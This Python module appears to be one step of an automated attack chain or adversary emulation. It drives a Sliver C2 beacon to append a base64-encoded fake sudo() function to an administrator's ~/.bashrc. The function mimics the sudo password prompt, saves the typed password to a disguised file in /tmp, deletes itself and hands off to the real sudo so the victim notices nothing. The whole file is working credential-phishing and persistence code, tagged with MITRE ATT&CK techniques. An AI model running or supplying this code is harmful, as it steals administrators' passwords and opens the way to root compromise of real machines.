import time
from chainlog import log
from advanced_initial_access import sliver_exec

# =============================================================================
# advanced_vinzenzws_privesc.py — Sudo Phishing via Sliver C2
# MITRE ATT&CK:
#   T1556.003 - Modify Authentication Process (Sudo Phishing)
#   T1078     - Valid Accounts (Root access)
# -----------------------------------------------------------------------------
# Executes FROM kali, driving the sliver beacon running on vinzenz's
# workstation. It appends a malicious ``sudo()`` shell function to
# ~/.bashrc; the function captures the password the next time the admin
# runs sudo in an interactive shell, writes it to /tmp/.sys_update.lock on
# the target for later retrieval, then transparently invokes the real
# /usr/bin/sudo so the admin's command succeeds and they notice nothing.
# =============================================================================

def run(vinzenz_beacon, kali_host):
    """
    Inject a Sudo Phish function into vinzenz's ~/.bashrc, wait for the admin
    to use sudo in an interactive shell, and capture the password into a local
    file on the target.

    Args:
        vinzenz_beacon (str): Sliver beacon ID running on vinzenz's workstation.
        kali_host (str):      Kali IP (reserved for future curl-based exfil --
                              the current implementation only writes the
                              captured password to a file on the target).

    Returns:
        dict: ``{"vinzenz_password_file": "/tmp/.sys_update.lock"}`` on success,
              ``{"vinzenz_password_file": None}`` on injection failure.
    """
    log("\n[*] Starting Sudo Phishing on Vinzenz Workstation (T1556.003)...")

    # Sentinels delimit the injected block so the self-unhook sed (and any
    # future external cleanup) deletes only our function -- never
    # neighbouring user content in ~/.bashrc. The previous range pattern
    # ``/sudo() {/,/}/`` matched on the next ``}`` anywhere in the file,
    # which would have clobbered unrelated function bodies.
    SENTINEL_BEGIN = "# __SUDO_PHISH_BEGIN__"
    SENTINEL_END   = "# __SUDO_PHISH_END__"

    # The phish payload: prompts like real sudo, reads the password
    # silently, writes it to /tmp/.sys_update.lock on the target, then
    # transparently invokes the real /usr/bin/sudo so the admin's command
    # runs normally and nothing looks wrong on their end.
    payload = f"""{SENTINEL_BEGIN}
sudo() {{
    read -rsn1 -p "[sudo] password for $USER: " firstchar
    if [ -z "$firstchar" ]; then echo; /usr/bin/sudo "$@"; return; fi
    read -rs pass
    pass="$firstchar$pass"
    echo
    echo "$pass" > /tmp/.sys_update.lock
    # Self-unhook: delete only the sentinel-bounded block we injected.
    sed -i '/^{SENTINEL_BEGIN}$/,/^{SENTINEL_END}$/d' ~/.bashrc 2>/dev/null
    unset -f sudo
    # Pass control to the real sudo so the admin's command runs normally.
    echo "$pass" | /usr/bin/sudo -S "$@"
}}
{SENTINEL_END}
"""
    
    log("[*] Injecting malicious sudo function into ~/.bashrc...")

    # Encode payload to base64 to avoid shell escaping issues
    b64_payload = __import__('base64').b64encode(payload.encode()).decode()
    cmd = f"execute -o -- sh -c 'echo \"{b64_payload}\" | base64 -d >> ~/.bashrc'"

    out = sliver_exec(vinzenz_beacon, cmd)
    if out and "error" in out.lower():
        log(f"[-] Failed to inject sudo function: {out.strip()}")
        return {"vinzenz_password_file": None}

    log(f"[*] Sudo function injected. The password will be saved to /tmp/.sys_update.lock locally.")
    log(f"[*] Waiting 45 seconds to ensure the admin triggers the function...")
    
    __import__('time').sleep(45)
    
    log("[+] Sudo Phish complete! The password is now stored locally on the target for future use.")
    return {"vinzenz_password_file": "/tmp/.sys_update.lock"}
